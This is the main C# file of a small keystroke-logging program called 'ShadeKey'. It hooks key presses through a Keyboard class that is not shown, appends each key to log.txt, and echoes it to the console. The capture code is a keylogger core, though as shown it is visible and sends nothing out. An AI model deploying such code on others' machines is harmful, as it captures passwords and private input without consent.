using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace ShadeKey
{
    class Program
    {
        private static Keyboard keyboard;
        private static LogFile logFile;
        static void Main(string[] args)
        {
            logFile = new LogFile("log.txt",10);
            keyboard = new Keyboard();
            keyboard.KeyIsPressed += K_KeyIsPressed;

            Console.Read();

            while (true) 
            {
                Thread.Sleep(1000); 
            }
        }

        private static void K_KeyIsPressed(KeyValuePair<byte, string> keyValue)
        {
            logFile.AppendData(keyValue.Value + ",");
            Console.WriteLine("vk_code {0} : {1}", keyValue.Key, keyValue.Value);
        }
    }
}
